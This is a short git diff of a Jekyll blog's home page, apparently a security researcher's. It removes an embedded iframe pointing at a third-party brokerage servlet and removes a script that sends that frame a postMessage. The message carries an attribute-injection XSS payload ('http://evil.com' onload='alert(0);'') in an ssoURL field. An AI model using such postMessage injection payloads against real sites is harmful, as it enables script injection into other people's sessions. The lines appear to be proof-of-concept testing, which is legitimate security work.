@@ -3,7 +3,7 @@ layout: default
 title: Home
 ---
 
-<iframe id="folio" src="https://qa8.foliodx.com/brokerage/AControlServlet"></iframe>
+
 <p align="right"><b><u>Reconnaissance is the key!  Fuzz for the hole!</u></b></p><br><br>
 
   {% for post in paginator.posts %}
@@ -37,9 +37,4 @@ title: Home
     <span class="pagination-item older">Older</span>
   {% endif %}
 </div>
-<script>
- var message= {type:"message",data:{abc:"def",request:"attack",eventName:"folioActionLaunch",data:{ssoURL:"http://evil.com' onload='alert(0);'"}}};
- //var win = ;
- document.getElementById("folio").postMessage(message,"*");
-</script>
   
